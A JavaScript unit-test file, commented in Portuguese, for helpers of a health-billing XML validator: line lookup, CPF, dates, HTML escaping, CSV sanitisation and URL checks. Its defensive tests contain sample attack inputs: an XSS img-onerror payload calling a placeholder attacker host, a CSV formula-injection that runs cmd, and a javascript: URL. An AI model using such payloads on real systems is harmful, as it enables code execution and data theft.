// Testes das funções puras do PINWARE-TISS.
// Rodar com: node --test tests/
//
// Cobre apenas lógica que não depende de DOM/DOMParser (findLineNumber,
// sanitização, CPF, data). A lógica de regras de negócio (REG001-REG007) e o
// ruleEngine dependem de nós de DOM reais e ficam fora deste primeiro passo —
// exigiriam um shim de DOM (ex: jsdom) para rodar fora do navegador.

import { test } from 'node:test';
import assert from 'node:assert/strict';

import { findLineNumber, getTagVal, getElementsByLocalName } from '../js/utils/xml.js';
import { isValidCPF } from '../js/utils/cpf.js';
import { parseDate } from '../js/utils/date.js';
import { escapeHtml } from '../js/ui.js';
import { sanitizeCsvField } from '../js/exports.js';
import { isValidSguUrl, formatRelativeSavedAt } from '../js/sgu.js';

test('findLineNumber: encontra a primeira ocorrência a partir do início', () => {
    const linhas = ['<lote>', '  <guia>123</guia>', '  <valor>50</valor>'];
    assert.equal(findLineNumber(linhas, '123'), 2);
});

test('findLineNumber: busca a partir de startFrom, ignorando ocorrências anteriores', () => {
    // Mesmo código de procedimento aparece em duas guias diferentes; buscar a
    // partir da linha da segunda guia deve retornar a ocorrência correta, não
    // a primeira do arquivo (o bug relatado na revisão).
    const linhas = [
        '<guia id="A">',      // 1
        '  <codigo>999</codigo>', // 2 (pertence à guia A)
        '</guia>',             // 3
        '<guia id="B">',      // 4
        '  <codigo>999</codigo>', // 5 (pertence à guia B)
        '</guia>',             // 6
    ];
    assert.equal(findLineNumber(linhas, '999', 0), 2);
    assert.equal(findLineNumber(linhas, '999', 4), 5);
});

test('findLineNumber: cursor monotônico resolve códigos duplicados na mesma guia', () => {
    const linhas = [
        '<guia>',                    // 1
        '  <codigo>111</codigo>',    // 2 (1ª ocorrência do duplicado)
        '  <codigo>111</codigo>',    // 3 (2ª ocorrência do duplicado)
        '</guia>',                   // 4
    ];
    const primeira = findLineNumber(linhas, '111', 0);
    assert.equal(primeira, 2);
    // Avançando o cursor para depois da primeira ocorrência, a próxima busca
    // deve achar a segunda linha, não repetir a primeira.
    const segunda = findLineNumber(linhas, '111', primeira);
    assert.equal(segunda, 3);
});

test('findLineNumber: retorna startFrom (ou 1) quando não encontra nada', () => {
    const linhas = ['<a>', '<b>'];
    assert.equal(findLineNumber(linhas, 'inexistente'), 1);
    assert.equal(findLineNumber(linhas, 'inexistente', 2), 2);
});

test('getTagVal / getElementsByLocalName: leem valores de nós XML por nome local', { skip: typeof DOMParser === 'undefined' && 'requer DOMParser (rodar no navegador ou instalar jsdom)' }, () => {
    const xml = new DOMParser().parseFromString(`<raiz><ns:tag xmlns:ns="x">  valor  </ns:tag></raiz>`, 'text/xml');
    const nos = getElementsByLocalName(xml.documentElement, 'tag');
    assert.equal(nos.length, 1);
    assert.equal(getTagVal(xml.documentElement, 'tag'), 'valor');
});

test('escapeHtml: neutraliza tags e atributos maliciosos vindos do XML', () => {
    const malicioso = `<img src=x onerror="fetch('https://atacante.com')">`;
    const escapado = escapeHtml(malicioso);
    assert.ok(!escapado.includes('<img'));
    assert.ok(escapado.includes('&lt;img'));
});

test('escapeHtml: lida com null/undefined sem lançar erro', () => {
    assert.equal(escapeHtml(null), '');
    assert.equal(escapeHtml(undefined), '');
});

test('sanitizeCsvField: neutraliza fórmulas (CSV Injection)', () => {
    assert.equal(sanitizeCsvField('=CMD|"/c calc"!A1').startsWith("'="), true);
    assert.equal(sanitizeCsvField('+1+1').startsWith("'+"), true);
    assert.equal(sanitizeCsvField('-1').startsWith("'-"), true);
    assert.equal(sanitizeCsvField('@SUM(1)').startsWith("'@"), true);
});

test('sanitizeCsvField: texto normal não é alterado', () => {
    assert.equal(sanitizeCsvField('Procedimento válido'), 'Procedimento válido');
});

test('sanitizeCsvField: escapa aspas duplas internas', () => {
    assert.equal(sanitizeCsvField('Erro "grave" detectado'), 'Erro ""grave"" detectado');
});

test('isValidCPF: valida CPFs conhecidos corretamente', () => {
    assert.equal(isValidCPF('111.111.111-11'), false); // dígitos repetidos
    assert.equal(isValidCPF('123'), false); // tamanho inválido
    assert.equal(isValidCPF(''), false);
    assert.equal(isValidCPF(null), false);
});

test('parseDate: extrai data de string ISO e ignora horário', () => {
    const d = parseDate('2026-08-20T10:00:00');
    assert.equal(d.getFullYear(), 2026);
    assert.equal(d.getMonth(), 7); // 0-indexed
    assert.equal(d.getDate(), 20);
});

test('parseDate: retorna null para entrada vazia ou inválida', () => {
    assert.equal(parseDate(''), null);
    assert.equal(parseDate(null), null);
    assert.equal(parseDate('2026-08'), null);
});

test('isValidSguUrl: aceita apenas URLs http(s) bem formadas', () => {
    assert.equal(isValidSguUrl('https://rda.unimedguarulhos.coop.br/cmagnet/auditoria/modal/novo_arquivo.do?dynaHash=abc'), true);
    assert.equal(isValidSguUrl('http://exemplo.com/x'), true);
    assert.equal(isValidSguUrl(''), false);
    assert.equal(isValidSguUrl(null), false);
    assert.equal(isValidSguUrl('não é uma url'), false);
    assert.equal(isValidSguUrl('javascript:alert(1)'), false);
    assert.equal(isValidSguUrl('ftp://exemplo.com/x'), false);
});

test('formatRelativeSavedAt: descreve o tempo decorrido em texto amigável', () => {
    const agora = Date.now();
    assert.equal(formatRelativeSavedAt(null), null);
    assert.equal(formatRelativeSavedAt(agora), 'salvo agora mesmo');
    assert.equal(formatRelativeSavedAt(agora - 5 * 60000), 'salvo há 5 minutos');
    assert.equal(formatRelativeSavedAt(agora - 2 * 3600000), 'salvo há 2 horas');
    assert.equal(formatRelativeSavedAt(agora - 3 * 86400000), 'salvo há 3 dias');
});
